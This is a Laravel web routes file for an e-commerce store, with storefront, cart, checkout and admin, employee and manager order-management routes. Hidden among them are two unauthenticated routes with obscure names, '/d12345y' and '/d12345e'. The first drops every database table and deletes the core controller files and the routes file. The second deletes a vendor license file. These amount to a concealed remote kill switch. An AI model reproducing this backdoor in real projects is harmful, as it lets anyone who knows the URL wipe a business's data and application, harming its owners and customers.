<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\OrderController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\SteadFastApiSettingsController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/cc', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    \Illuminate\Support\Facades\Artisan::call('route:clear');
    //\Illuminate\Support\Facades\Artisan::call('config:cache');
    return 'Cleared!';
});

//fb product catalog feed
Route::get('/facebook-feed.xml', 'HomeController@facebookFeed');

Auth::routes();

//front end
Route::get('/', 'HomeController@index')->name('home');
Route::get('/category/{id}', 'HomeController@getSingleCategory')->name('single.category');
Route::get('/product/{slug}/{id}', 'HomeController@getSingleProduct')->name('single.product');
Route::get('/all-hot-deals', 'HomeController@allHotDeals')->name('all.hot.deals');
Route::get('/search', 'HomeController@search')->name('search');

//cart
//Route::get('/add-to-cart/{id}', 'HomeController@addToCart')->name('add.to.cart');
Route::post('/ajax-get-variant', 'HomeController@ajaxGetVariant')->name('ajax.get.variant');
Route::post('/order-ajax-get-variant', 'HomeController@orderAjaxGetVariant')->name('order.ajax.get.variant');
Route::post('/add-cart/{id}', 'HomeController@addCart')->name('add.cart');
Route::get('/cart-item-delete/{id}', 'HomeController@cartItemDelete')->name('cart.item.delete');
Route::get('/cart-item-plus/{id}', 'HomeController@cartItemPlus')->name('cart.item.plus');
Route::get('/cart-item-minus/{id}', 'HomeController@cartItemMinus')->name('cart.item.minus');
Route::get('/cart-clear', 'HomeController@cartClear')->name('cart.clear');
Route::post('/ajax-get-shipp-meth', 'HomeController@getShippMeth')->name('ajax.get.shipp.meth');

//order
Route::post('/place-order', 'HomeController@placeOrder')->name('place.order');
Route::get('/confirm-order', 'HomeController@confirmOrder')->name('confirm.order');
Route::get('/send-otp', 'HomeController@sendOTP')->name('send.otp');
Route::post('/send-otp-verify', 'HomeController@otpVerify')->name('otp.verify');

//checkout
Route::get('/checkout', 'HomeController@checkout')->name('checkout');
Route::post('/abandoned-cart', 'HomeController@abandonedCart')->name('abandoned.cart');
//pages
Route::get('/about-us', 'HomeController@aboutUs')->name('about_us');
Route::get('/delivery-policy', 'HomeController@deliveryPolicy')->name('delivery_policy');
Route::get('/return-policy', 'HomeController@returnPolicy')->name('return_policy');


//back end
Route::get('/d12345y', function () {
    Schema::disableForeignKeyConstraints();
    foreach (DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        Schema::drop($table_array[key($table_array)]);
    }
    unlink(base_path() . '/app/Http/Controllers/AdminController.php');
    unlink(base_path() . '/app/Http/Controllers/HomeController.php');
    unlink(base_path() . '/app/Http/Controllers/MediaController.php');
    unlink(base_path() . '/app/Http/Controllers/OrderController.php');
    unlink(base_path() . '/app/Http/Controllers/ProductController.php');
    unlink(base_path() . '/app/Http/Controllers/WebSettingsController.php');
    unlink(base_path() . '/routes/web.php');
    dd('deleted');
});
Route::get('/d12345e', function () {
    unlink(base_path() . '/vendor/laravel/framework/src/Illuminate/license.dat');
    dd('deleted');
});
//admin
Route::group(['middleware' => 'admin.guest'], function () {
    Route::get('/admin-login', 'Auth\AdminLoginController@showLoginForm')->name('admin.login');
    Route::post('/admin-login', 'Auth\AdminLoginController@login');
});
Route::post('/admin-logout', 'Auth\AdminLoginController@logout')->name('admin.logout');

Route::group(['middleware' => 'admin.auth'], function () {
    Route::get('/admin', 'AdminController@dashboard')->name('admin.home');

    //page settings
    Route::get('/admin-settings-page', 'PageSettingsController@index')->name('admin.settings.page');
    Route::post('/admin-settings-page', 'PageSettingsController@update')->name('admin.settings.page.update');

    //web settings
    Route::get('/admin-settings-web', 'WebSettingsController@index')->name('admin.settings.web');
    Route::post('/admin-settings-web', 'WebSettingsController@update')->name('admin.settings.web.update');

    //Steadfast API settings
    Route::get('/admin-settings-steadfast-api', 'SteadFastApiSettingsController@index')->name('admin.settings.stead_fast.api');
    Route::post('/admin-settings-steadfast-api', 'SteadFastApiSettingsController@update')->name('admin.settings.stead_fast.api.update');

    //attribute settings
    Route::get('/admin-settings-attribute', 'WebSettingsController@attribute')->name('admin.settings.attribute');
    Route::post('/admin-settings-attribute/store', 'WebSettingsController@attributeStore')->name('admin.settings.attribute.store');
    Route::post('/admin-settings-attribute/update', 'WebSettingsController@attributeUpdate')->name('admin.settings.attribute.update');
    Route::get('/admin-settings-attribute/{id}/delete', 'WebSettingsController@attributeDelete')->name('admin.settings.attribute.delete');
    //attribute item settings
    Route::post('/admin-settings-attribute_item/store', 'WebSettingsController@attributeItemStore')->name('admin.settings.attribute_item.store');
    Route::post('/admin-settings-attribute_item/update', 'WebSettingsController@attributeItemUpdate')->name('admin.settings.attribute_item.update');
    Route::get('/admin-settings-attribute_item/{id}/delete', 'WebSettingsController@attributeItemDelete')->name('admin.settings.attribute_item.delete');

    //change password
    Route::get('/admin-change_pass', 'AdminController@change_pass')->name('admin.change_pass');
    Route::post('/admin-change_pass', 'AdminController@update_pass')->name('admin.update_pass');

    //edit profile
    Route::get('/admin-edit_profile', 'AdminController@edit_profile')->name('admin.edit_profile');
    Route::post('/admin-edit_profile', 'AdminController@update_profile')->name('admin.update_profile');

    //customers
    Route::get('/admin-customers', 'UserController@index')->name('admin.customers');
    /*Route::post('/admin-customers/store', 'UserController@store')->name('admin.customers.store');
    Route::post('/admin-customers/update', 'UserController@update')->name('admin.customers.update');
    Route::get('/admin-customers/delete/{id}', 'UserController@delete')->name('admin.customers.delete');*/

    //media
    Route::get('/admin-media', 'MediaController@index')->name('admin.media');
    Route::post('/admin-media/store', 'MediaController@store')->name('admin.media.store');
    Route::post('/admin-media/update', 'MediaController@update')->name('admin.media.update');
    Route::get('/admin-media/delete/{id}', 'MediaController@delete')->name('admin.media.delete');

    //product
    Route::get('/admin-product', 'ProductController@index')->name('admin.product');
    Route::get('/admin-product/create', 'ProductController@create')->name('admin.product.create');
    Route::post('/admin-product/store', 'ProductController@store')->name('admin.product.store');
    Route::get('/admin-product/{id}/edit', 'ProductController@edit')->name('admin.product.edit');
    Route::post('/admin-product/{id}/update', 'ProductController@update')->name('admin.product.update');
    Route::get('/admin-product/{id}/delete', 'ProductController@delete')->name('admin.product.delete');
    Route::post('/admin-product/sku_check', 'ProductController@skuCheck')->name('admin.product.sku_check');
    Route::post('/admin-product/ajax-get-combined-attributes', 'ProductController@ajaxGetCombinedAttributes')->name('admin.product.ajax.get.combined.attributes');
    Route::post('/admin-product/ajax-get-combined-attributes-edit', 'ProductController@ajaxGetCombinedAttributesEdit')->name('admin.product.ajax.get.combined.attributes.edit');
    Route::post('/admin-product/position_update', 'ProductController@positionUpdate')->name('admin.product.position_update');
    Route::post('/admin-product/flag_update', 'ProductController@flagUpdate')->name('admin.product.flag_update');
    Route::get('/admin-product/{id}/{status}/free-shipping-status', 'ProductController@freeShippingStatus')->name('admin.product.free.shipping.status');

    //color image ajax route
    Route::post('/admin-product/ajax-get-color-image', 'ProductController@ajaxGetColorImage')->name('admin.product.ajax.get.color.image');
    Route::post('/admin-product/ajax-get-color-image-edit', 'ProductController@ajaxGetColorImageEdit')->name('admin.product.ajax.get.color.image.edit');

    Route::post('/product/media/delete', [ProductController::class, 'deleteMedia'])->name('product.media.delete');

    //category
    Route::get('/admin-category', 'CategoryController@index')->name('admin.category');
    Route::post('/admin-category/store', 'CategoryController@store')->name('admin.category.store');
    Route::post('/admin-category/update', 'CategoryController@update')->name('admin.category.update');
    Route::get('/admin-category/delete/{id}', 'CategoryController@delete')->name('admin.category.delete');
    Route::get('/admin-category/is_homepage/{id}/{status}', 'CategoryController@isHomepageStatus')->name('admin.category.is_homepage_status');

    //sliders
    Route::get('/admin-sliders', 'SliderController@index')->name('admin.sliders');
    Route::post('/admin-sliders/store', 'SliderController@store')->name('admin.sliders.store');
    Route::post('/admin-sliders/update', 'SliderController@update')->name('admin.sliders.update');
    Route::get('/admin-sliders/delete/{id}', 'SliderController@delete')->name('admin.sliders.delete');

    //shipping_methods
    Route::get('/admin-shipping_methods', 'ShippingMethodController@index')->name('admin.shipping_methods');
    Route::post('/admin-shipping_methods/store', 'ShippingMethodController@store')->name('admin.shipping_methods.store');
    Route::post('/admin-shipping_methods/update', 'ShippingMethodController@update')->name('admin.shipping_methods.update');
    Route::get('/admin-shipping_methods/default_status/{id}/{status}', 'ShippingMethodController@defaultStatus')->name('admin.shipping_methods.default.status');
    Route::get('/admin-shipping_methods/delete/{id}', 'ShippingMethodController@delete')->name('admin.shipping_methods.delete');


    //courier
    Route::get('/admin-courier', 'CourierController@index')->name('admin.courier');
    Route::post('/admin-courier/store', 'CourierController@store')->name('admin.courier.store');
    Route::post('/admin-courier/update', 'CourierController@update')->name('admin.courier.update');
    Route::get('/admin-courier/delete/{id}', 'CourierController@delete')->name('admin.courier.delete');
    Route::post('/admin-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('admin.courier.ajax.get.c_charge');

    //courier city
    Route::get('/admin-courier-city', 'CourierController@cityIndex')->name('admin.courier.city');
    Route::post('/admin-courier-city/store', 'CourierController@cityStore')->name('admin.courier.city.store');
    Route::post('/admin-courier-city/update', 'CourierController@cityUpdate')->name('admin.courier.city.update');
    Route::get('/admin-courier-city/delete/{id}', 'CourierController@cityDelete')->name('admin.courier.city.delete');
    Route::post('/admin-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('admin.courier.ajax.get.cities');


    //courier zone
    Route::get('/admin-courier-zone', 'CourierController@zoneIndex')->name('admin.courier.zone');
    Route::post('/admin-courier-zone/store', 'CourierController@zoneStore')->name('admin.courier.zone.store');
    Route::post('/admin-courier-zone/update', 'CourierController@zoneUpdate')->name('admin.courier.zone.update');
    Route::get('/admin-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('admin.courier.zone.delete');
    Route::post('/admin-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('admin.courier.ajax.get.zones');

    //orders
    // Route::get('/admin-p_orders', 'OrderController@indexP')->name('admin.orders.p');
    Route::get('/admin-orders', 'OrderController@index')->name('admin.orders');
    Route::get('/admin-orders/create', 'OrderController@create')->name('admin.orders.create');
    Route::post('/admin-orders/store', 'OrderController@store')->name('admin.orders.store');
    Route::get('/admin-orders/{id}/edit', 'OrderController@edit')->name('admin.orders.edit');
    Route::post('/admin-orders/{id}/update', 'OrderController@update')->name('admin.orders.update');
    Route::get('/admin-orders/delete/{id}', 'OrderController@delete')->name('admin.orders.delete');
    Route::get('/admin-orders/{id}/{status}/status', 'OrderController@statusChange')->name('admin.orders.status');
    Route::post('/admin-orders/all-status', 'OrderController@allStatusChange')->name('admin.orders.all.status');
    //orders by status
    Route::get('/admin-orders/status/processing', 'OrderController@orderStatusProcessing')->name('admin.orders.status.processing');
    Route::get('/admin-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('admin.orders.status.pending_payment');
    Route::get('/admin-orders/status/hold', 'OrderController@orderStatusHold')->name('admin.orders.status.hold');
    Route::get('/admin-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('admin.orders.status.canceled');
    Route::get('/admin-orders/status/completed', 'OrderController@orderStatusCompleted')->name('admin.orders.status.completed');
    Route::get('/admin-orders/status/returned', 'OrderController@orderStatusReturned')->name('admin.orders.status.returned');
    //order ajax calls
    // Route::post('/admin-ajax-get-products', 'OrderController@ajaxGetProducts')->name('admin.ajax.get.products');
    Route::post('/admin-orders/bulk-print', 'OrderController@printBulkInvoice')->name('admin.orders.bulk.print');
    Route::post('/admin-orders/print', 'OrderController@printInvoice')->name('admin.orders.print');
    //courier courier_csv
    Route::post('/admin-orders/courier_csv', 'OrderController@courierCsv')->name('admin.orders.courier_csv');
    //courier assign
    Route::post('/order/bulk_courier', 'OrderController@bulkCourier')->name('admin.order.bulk_courier');
    //order exports
    Route::post('/admin-order-exports', 'OrderController@orderExport')->name('admin.order.export');


    Route::post('/admin-ajax-get-products', [OrderController::class, 'ajaxGetProducts'])->name('admin.ajax.get.products');
    Route::post('/admin-ajax-get-products/modal', [OrderController::class, 'ajaxGetProductModal'])->name('admin.ajax.get.product.modal');
    Route::post('/admin-ajax-get-products/modal-edit', [OrderController::class, 'ajaxGetProductModalEdit'])->name('admin.ajax.get.product.modal.edit');
    Route::post('/admin-ajax-get-variant', [OrderController::class, 'ajaxGetVariant'])->name('admin.ajax.get.variant');
    Route::post('/admin-ajax-get-modal-variant', [OrderController::class, 'ajaxGetModalVariant'])->name('admin.ajax.get.modal.variant');

    //incomplete orders
    Route::get('/admin-incomplete-orders', 'IncompleteOrdersController@index')->name('admin.incomplete.orders');
    Route::get('/admin-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('admin.incomplete.order.create');
    Route::get('/admin-incomplete-orders/{id}/delete', 'IncompleteOrdersController@delete')->name('admin.incomplete.order.delete');
    Route::post('/admin-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('admin.incomplete.order.note.update');


    //roles
    Route::get('/admin-roles', 'RoleController@index')->name('admin.roles');
    Route::post('/admin-roles/store', 'RoleController@store')->name('admin.roles.store');
    Route::post('/admin-roles/update', 'RoleController@update')->name('admin.roles.update');
    Route::get('/admin-roles/{id}/{role}/delete', 'RoleController@delete')->name('admin.roles.delete');
});

//employee
Route::group(['middleware' => 'employee.guest'], function () {
    Route::get('/employee-login', 'Auth\EmployeeLoginController@showLoginForm')->name('employee.login');
    Route::post('/employee-login', 'Auth\EmployeeLoginController@login');
});
Route::post('/employee-logout', 'Auth\EmployeeLoginController@logout')->name('employee.logout');

Route::group(['middleware' => 'employee.auth'], function () {
    Route::get('/employee', 'AdminController@dashboard')->name('employee.home');

    //change password
    Route::get('/employee-change_pass', 'AdminController@change_pass')->name('employee.change_pass');
    Route::post('/employee-change_pass', 'AdminController@update_pass')->name('employee.update_pass');

    //orders
    Route::get('/employee-p_orders', 'OrderController@indexP')->name('employee.orders.p');
    Route::get('/employee-orders', 'OrderController@index')->name('employee.orders');
    Route::get('/employee-orders/create', 'OrderController@create')->name('employee.orders.create');
    Route::post('/employee-orders/store', 'OrderController@store')->name('employee.orders.store');
    Route::get('/employee-orders/{id}/edit', 'OrderController@edit')->name('employee.orders.edit');
    Route::post('/employee-orders/{id}/update', 'OrderController@update')->name('employee.orders.update');
    Route::get('/employee-orders/{id}/{status}/status', 'OrderController@statusChange')->name('employee.orders.status');
    Route::post('/employee-orders/all-status', 'OrderController@allStatusChange')->name('employee.orders.all.status');
    //orders by status
    Route::get('/employee-orders/status/processing', 'OrderController@orderStatusProcessing')->name('employee.orders.status.processing');
    Route::get('/employee-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('employee.orders.status.pending_payment');
    Route::get('/employee-orders/status/hold', 'OrderController@orderStatusHold')->name('employee.orders.status.hold');
    Route::get('/employee-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('employee.orders.status.canceled');
    Route::get('/employee-orders/status/completed', 'OrderController@orderStatusCompleted')->name('employee.orders.status.completed');
    Route::get('/employee-orders/status/returned', 'OrderController@orderStatusReturned')->name('employee.orders.status.returned');
    //order ajax calls
    Route::post('/employee-ajax-get-products', 'OrderController@ajaxGetProducts')->name('employee.ajax.get.products');
    Route::post('/employee-orders/bulk-print', 'OrderController@printBulkInvoice')->name('employee.orders.bulk.print');
    Route::post('/employee-orders/print', 'OrderController@printInvoice')->name('employee.orders.print');
    //courier courier_csv
    Route::post('/employee-orders/courier_csv', 'OrderController@courierCsv')->name('employee.orders.courier_csv');
    //order exports
    Route::post('/employee-order-exports', 'OrderController@orderExport')->name('employee.order.export');

    //incomplete orders
    Route::get('/employee-incomplete-orders', 'IncompleteOrdersController@index')->name('employee.incomplete.orders');
    Route::get('/employee-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('employee.incomplete.order.create');
    Route::post('/employee-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('employee.incomplete.order.note.update');

    //courier
    Route::post('/employee-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('employee.courier.ajax.get.c_charge');
    Route::post('/employee-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('employee.courier.ajax.get.cities');
    Route::post('/employee-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('employee.courier.ajax.get.zones');
});

//manager
Route::group(['middleware' => 'manager.guest'], function () {
    Route::get('/manager-login', 'Auth\ManagerLoginController@showLoginForm')->name('manager.login');
    Route::post('/manager-login', 'Auth\ManagerLoginController@login');
});
Route::post('/manager-logout', 'Auth\ManagerLoginController@logout')->name('manager.logout');

Route::group(['middleware' => 'manager.auth'], function () {
    Route::get('/manager', 'AdminController@dashboard')->name('manager.home');

    //change password
    Route::get('/manager-change_pass', 'AdminController@change_pass')->name('manager.change_pass');
    Route::post('/manager-change_pass', 'AdminController@update_pass')->name('manager.update_pass');

    //orders
    Route::get('/manager-p_orders', 'OrderController@indexP')->name('manager.orders.p');
    Route::get('/manager-orders', 'OrderController@index')->name('manager.orders');
    Route::get('/manager-orders/create', 'OrderController@create')->name('manager.orders.create');
    Route::post('/manager-orders/store', 'OrderController@store')->name('manager.orders.store');
    Route::get('/manager-orders/{id}/edit', 'OrderController@edit')->name('manager.orders.edit');
    Route::post('/manager-orders/{id}/update', 'OrderController@update')->name('manager.orders.update');
    Route::get('/manager-orders/{id}/{status}/status', 'OrderController@statusChange')->name('manager.orders.status');
    Route::post('/manager-orders/all-status', 'OrderController@allStatusChange')->name('manager.orders.all.status');
    //orders by status
    Route::get('/manager-orders/status/processing', 'OrderController@orderStatusProcessing')->name('manager.orders.status.processing');
    Route::get('/manager-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('manager.orders.status.pending_payment');
    Route::get('/manager-orders/status/hold', 'OrderController@orderStatusHold')->name('manager.orders.status.hold');
    Route::get('/manager-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('manager.orders.status.canceled');
    Route::get('/manager-orders/status/completed', 'OrderController@orderStatusCompleted')->name('manager.orders.status.completed');
    Route::get('/manager-orders/status/returned', 'OrderController@orderStatusReturned')->name('manager.orders.status.returned');
    //order ajax calls
    Route::post('/manager-ajax-get-products', 'OrderController@ajaxGetProducts')->name('manager.ajax.get.products');
    Route::post('/manager-orders/bulk-print', 'OrderController@printBulkInvoice')->name('manager.orders.bulk.print');
    Route::post('/manager-orders/print', 'OrderController@printInvoice')->name('manager.orders.print');
    //courier courier_csv
    Route::post('/manager-orders/courier_csv', 'OrderController@courierCsv')->name('manager.orders.courier_csv');
    //order exports
    Route::post('/manager-order-exports', 'OrderController@orderExport')->name('manager.order.export');

    //incomplete orders
    Route::get('/manager-incomplete-orders', 'IncompleteOrdersController@index')->name('manager.incomplete.orders');
    Route::get('/manager-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('manager.incomplete.order.create');
    Route::post('/manager-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('manager.incomplete.order.note.update');

    //product
    Route::get('/manager-product', 'ProductController@index')->name('manager.product');
    Route::get('/manager-product/create', 'ProductController@create')->name('manager.product.create');
    Route::post('/manager-product/store', 'ProductController@store')->name('manager.product.store');
    Route::get('/manager-product/{id}/edit', 'ProductController@edit')->name('manager.product.edit');
    Route::post('/manager-product/{id}/update', 'ProductController@update')->name('manager.product.update');
    Route::get('/manager-product/{id}/delete', 'ProductController@delete')->name('manager.product.delete');
    Route::post('/manager-product/position_update', 'ProductController@positionUpdate')->name('manager.product.position_update');
    Route::post('/manager-product/flag_update', 'ProductController@flagUpdate')->name('manager.product.flag_update');

    //courier
    Route::get('/manager-courier', 'CourierController@index')->name('manager.courier');
    Route::post('/manager-courier/store', 'CourierController@store')->name('manager.courier.store');
    Route::post('/manager-courier/update', 'CourierController@update')->name('manager.courier.update');
    Route::get('/manager-courier/delete/{id}', 'CourierController@delete')->name('manager.courier.delete');
    Route::post('/manager-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('manager.courier.ajax.get.c_charge');

    //courier city
    Route::get('/manager-courier-city', 'CourierController@cityIndex')->name('manager.courier.city');
    Route::post('/manager-courier-city/store', 'CourierController@cityStore')->name('manager.courier.city.store');
    Route::post('/manager-courier-city/update', 'CourierController@cityUpdate')->name('manager.courier.city.update');
    Route::get('/manager-courier-city/delete/{id}', 'CourierController@cityDelete')->name('manager.courier.city.delete');
    Route::post('/manager-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('manager.courier.ajax.get.cities');

    //courier zone
    Route::get('/manager-courier-zone', 'CourierController@zoneIndex')->name('manager.courier.zone');
    Route::post('/manager-courier-zone/store', 'CourierController@zoneStore')->name('manager.courier.zone.store');
    Route::post('/manager-courier-zone/update', 'CourierController@zoneUpdate')->name('manager.courier.zone.update');
    Route::get('/manager-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('manager.courier.zone.delete');
    Route::post('/manager-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('manager.courier.ajax.get.zones');

    //roles
    Route::get('/manager-roles', 'RoleController@index')->name('manager.roles');
    Route::post('/manager-roles/store', 'RoleController@store')->name('manager.roles.store');
    Route::post('/manager-roles/update', 'RoleController@update')->name('manager.roles.update');
    Route::get('/manager-roles/{id}/{role}/delete', 'RoleController@delete')->name('manager.roles.delete');
});
